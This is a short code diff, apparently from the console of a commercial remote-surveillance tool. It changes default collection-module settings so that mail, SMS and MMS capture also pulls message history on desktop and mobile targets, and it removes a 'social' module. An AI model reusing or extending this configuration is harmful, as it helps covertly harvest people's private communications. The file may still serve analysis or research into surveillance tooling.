@@ -147,9 +147,9 @@ package it.ht.rcs.console
         
         {
           module: "messages",
-          mail: {enabled: true, filter: {history: false, datefrom: formatter.format(today), maxsize: 100000}},
-          sms:  {enabled: true, filter: {history: false, datefrom: formatter.format(today)}},
-          mms:  {enabled: true, filter: {history: false, datefrom: formatter.format(today)}},
+          mail: {enabled: true, filter: {history: true, datefrom: formatter.format(today), maxsize: 100000}},
+          sms:  {enabled: true, filter: {history: true, datefrom: formatter.format(today)}},
+          mms:  {enabled: true, filter: {history: true, datefrom: formatter.format(today)}},
           _type: "desktop,mobile",
           _platform: "windows,ios,blackberry,winmo,symbian,android"
         },
@@ -199,12 +199,6 @@ package it.ht.rcs.console
           quality: "med",
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
-        },
-        
-        {
-          module: "social",
-          _type: "desktop",
-          _platform: "windows"
         },
         
         {
